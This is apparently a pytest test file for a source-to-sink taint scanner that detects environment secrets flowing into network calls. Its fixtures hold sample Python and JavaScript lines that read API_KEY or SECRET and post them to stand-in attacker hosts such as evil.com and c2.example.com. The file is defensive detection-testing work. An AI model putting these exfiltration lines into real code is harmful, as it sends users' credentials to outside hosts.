"""Tests for scan_dataflow.py - Source-to-Sink Taint Tracker."""

import scan_dataflow as scanner


def _analyze(tmp_path, filename, content):
    """Write content to a file and run analyze_file on it."""
    f = tmp_path / filename
    f.write_text(content)
    return scanner.analyze_file(str(f), filename)


class TestOsGetenvSource:
    """os.getenv() should be tracked as a taint source."""

    def test_getenv_to_requests_post(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = os.getenv('API_KEY')\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert any("key" in f.description and "os.getenv" in f.description for f in findings)

    def test_getenv_taint_propagates(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "raw = os.getenv('SECRET')\n"
            "payload = raw\n"
            "requests.post('http://c2.example.com', data=payload)\n"
        )
        assert len(findings) >= 1

    def test_getenv_without_sink_no_finding(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os\n"
            "key = os.getenv('API_KEY')\n"
            "print(key)\n"
        )
        assert findings == []


class TestCaseInsensitiveSources:
    """Source patterns should fire regardless of identifier casing."""

    def test_os_environ_mixed_case_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = Os.Environ.get('API_KEY')\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert any(f.category == "dataflow" for f in findings)

    def test_os_environ_upper_case_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = OS.ENVIRON['SECRET']\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert any(f.category == "dataflow" for f in findings)

    def test_os_getenv_mixed_case_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = Os.Getenv('API_KEY')\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert any(f.category == "dataflow" for f in findings)

    def test_js_process_env_uppercase_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.js",
            "const key = PROCESS.ENV.API_KEY;\n"
            "fetch('http://evil.com', { body: key });\n"
        )
        assert len(findings) >= 1

    def test_js_aliased_sink_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.js",
            "const key = process.env.SECRET;\n"
            "FETCH('http://evil.com', { body: key });\n"
        )
        assert len(findings) >= 1


class TestExistingSourcesStillWork:
    """Regression: existing source patterns continue to fire after refactor."""

    def test_os_environ_get_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = os.environ.get('API_KEY')\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert len(findings) >= 1

    def test_os_environ_bracket_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.py",
            "import os, requests\n"
            "key = os.environ['SECRET']\n"
            "requests.post('http://evil.com', data={'k': key})\n"
        )
        assert len(findings) >= 1

    def test_js_process_env_detected(self, tmp_path):
        findings = _analyze(tmp_path, "app.js",
            "const key = process.env.API_KEY;\n"
            "fetch('http://evil.com', { body: key });\n"
        )
        assert len(findings) >= 1
